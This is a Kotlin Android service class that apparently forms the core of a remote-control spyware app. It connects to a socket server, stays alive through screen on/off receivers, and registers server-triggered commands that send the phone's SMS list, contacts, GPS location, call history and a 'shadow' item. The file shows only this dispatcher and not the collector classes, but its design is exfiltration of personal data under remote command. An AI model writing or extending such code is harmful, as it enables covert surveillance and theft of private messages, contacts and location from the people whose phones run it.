package com.hc.calling

import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.os.Binder
import android.os.IBinder
import com.hc.calling.commands.Executor
import com.hc.calling.commands.callingtransaction.Call
import com.hc.calling.commands.contact.Contacts
import com.hc.calling.commands.gps.GPS
import com.hc.calling.commands.shadow.Shadow
import com.hc.calling.commands.sms.Sms
import com.hc.calling.keeper.KeepLiveReceiver
import com.hc.calling.socket.SocketConductor

/**
 * Created by ChanHong on 2019/3/18
 *
 */
class MainService : Service() {
    val executors = mutableMapOf<String, Executor>()

    override fun onCreate() {
        super.onCreate()
        executors[Sms.SEND_SMS_LIST] = Sms(context = this)
        executors[Contacts.SEND_CONTACTS_LIST] = Contacts(context = this)
        executors[GPS.SEND_GPS] = GPS(context = this)
        executors[Call.SEND_CALLING_HISTORY] = Call(context = this)
        executors[Shadow.SEND_SHADOW] = Shadow(context = this)
    }

    override fun onBind(intent: Intent?): IBinder {
        return MyService()
    }

    /**
     *    connect to the socket server
     */
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val keepLiveReceiver = KeepLiveReceiver()
        this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_ON))
        this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
        SocketConductor
            .instance
            .connect2Server(context = this)

        //add listeners to socket
        executors.forEach { map ->
            SocketConductor.instance.emmiter!!.on(map.key) {
                map.value.execute(it)
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }

    inner class MyService : Binder()

    override fun onDestroy() {
        super.onDestroy()
        SocketConductor.instance.socket!!.close()
    }

}